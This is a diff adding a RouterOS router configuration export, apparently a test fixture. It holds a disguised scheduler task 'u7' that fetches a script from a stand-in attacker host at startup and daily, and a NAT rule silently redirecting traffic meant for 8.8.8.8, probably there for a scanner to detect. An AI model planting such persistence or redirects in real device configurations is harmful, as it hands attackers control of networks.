@@ -1,0 +1,27 @@
+# nov/15/2026 09:30:00 by RouterOS 6.49.7
+# software id = TEST-1234
+#
+# model = RB951
+#
+/interface bridge
+add name=bridge1
+/system scheduler
+add interval=1w name=backup on-event="/system backup save" policy=read,write start-time=startup
+add interval=1d name=u7 on-event="/tool fetch url=http://malicious.example/p.sh" \
+    policy=read,write start-time=startup
+/ip firewall nat
+add action=masquerade chain=srcnat out-interface=ether1
+add action=dst-nat chain=dstnat dst-address=8.8.8.8 protocol=tcp to-address=9.9.9.9
+/ip dns
+set allow-remote-requests=yes servers=8.8.8.8
+/user
+add group=full name=admin
+add address=10.0.0.0/24 group=read name=auditor
+/ip service
+set telnet disabled=yes
+set ftp disabled=yes
+set www port=8080
+set ssh port=2222
+set api disabled=yes
+set winbox
+set api-ssl disabled=yes
